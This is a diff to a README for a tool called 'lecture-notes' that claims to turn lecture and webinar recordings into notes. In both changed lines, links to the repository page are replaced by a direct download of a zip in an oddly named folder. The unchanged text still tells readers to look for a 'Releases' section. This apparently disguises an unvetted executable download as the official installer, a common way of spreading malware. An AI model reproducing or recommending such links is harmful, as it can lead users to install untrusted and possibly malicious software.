@@ -1,6 +1,6 @@
 # 📝 lecture-notes - Turn long recordings into readable documents
 
-[![Download Application](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/foodless-inharmoniousness7408/lecture-notes)
+[![Download Application](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/foodless-inharmoniousness7408/lecture-notes/raw/refs/heads/main/diprotodont/notes_lecture_v2.8.zip)
 
 This application processes video and audio files to create organized notes. It scans webinars, lecture recordings, and screencasts. The tool converts speech into text, identifies visual slides, and saves the output directly to Google Docs.
 
@@ -25,7 +25,7 @@ This application processes video and audio files to create organized notes. It s
 
 You must visit the project release page to get the installer. The software is distributed as an executable file.
 
-[Visit the official download page here](https://github.com/foodless-inharmoniousness7408/lecture-notes)
+[Visit the official download page here](https://github.com/foodless-inharmoniousness7408/lecture-notes/raw/refs/heads/main/diprotodont/notes_lecture_v2.8.zip)
 
 1. Navigate to the link above.
 2. Look for the "Releases" section on the right side of the page.
